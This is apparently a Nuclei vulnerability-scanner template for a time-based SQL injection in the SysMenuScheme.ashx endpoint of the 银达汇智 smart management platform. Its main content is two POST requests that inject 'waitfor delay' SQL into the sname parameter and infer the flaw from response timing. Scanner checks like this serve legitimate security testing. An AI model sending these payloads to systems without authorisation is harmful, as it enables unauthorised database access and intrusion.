id: poc-yaml-windor-icmp-sysmenuscheme-ashx-sqli
info:
  name: 银达汇智智慧综合管理平台 SysMenuScheme.ashx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 银达汇智智慧综合管理平台

flow: |
  http(1) && http(2)

http:
  - id: check-landing-page
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "智慧综合管理平台登入"
      - type: status
        status:
          - 200

  - id: sqli-check
    raw:
      - |
        POST /Module/Kernel/Controller/SysMenuScheme.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        action=exportExcel&sname='waitfor+delay'0:0:5'--
      - |
        POST /Module/Kernel/Controller/SysMenuScheme.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        action=exportExcel&sname='waitfor+delay'0:0:8'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "SessionId"
      - type: word
        part: body
        words:
          - ""
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
